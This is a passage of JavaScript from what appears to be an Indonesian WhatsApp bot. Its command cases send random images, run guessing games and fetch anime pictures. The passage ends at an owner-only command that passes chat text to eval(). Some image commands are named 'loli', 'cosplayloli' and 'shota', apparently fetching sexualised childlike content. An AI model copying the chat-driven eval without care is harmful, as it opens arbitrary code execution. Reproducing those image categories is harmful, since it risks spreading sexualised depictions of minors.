yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
replygcTzy(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
        case 'family100': {
 if ('family100'+from in _family100) {
 replygcTzy('Masih Ada Sesi Yang Belum Diselesaikan!')
 throw false
 }
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 _family100['family100'+from] = {
 id: 'family100'+from,
 pesan: await yudamods.sendText(from, hasil, m),
 ...random,
 terjawab: Array.from(random.jawaban, () => false),
 hadiah: 6,
 }
}
break
//=================================================//
case 'tebak': {
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./lib/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await yudamods.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 yudamods.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 yudamods.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 yudamods.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 yudamods.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 yudamods.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 yudamods.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 yudamods.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 yudamods.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 yudamods.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 yudamods.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 yudamods.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(3000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 yudamods.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'lizard':
case 'meow':
case 'tickle':
replygcTzy(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
            await yudamods.sendMessage(m.chat,{ caption: mess.success, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewallpaper2': case 'animewall2': {
                if (!args.join(" ")) return replygcTzy("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                yudamods.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcTzy('What wallpaper do you want?')
replygcTzy(mess.wait)
const wall = new AnimeWallpaper();
    const pages = [1,2,3,4];
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null);
const i = Math.floor(Math.random() * wallpaper.length);     
            await yudamods.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//yudamods.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return replyprem(mess.premium)
replygcTzy(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
yudamods.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '>':
case '=>':
if (!TzyTheCreator) return;
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replygcTzy(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcTzy(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
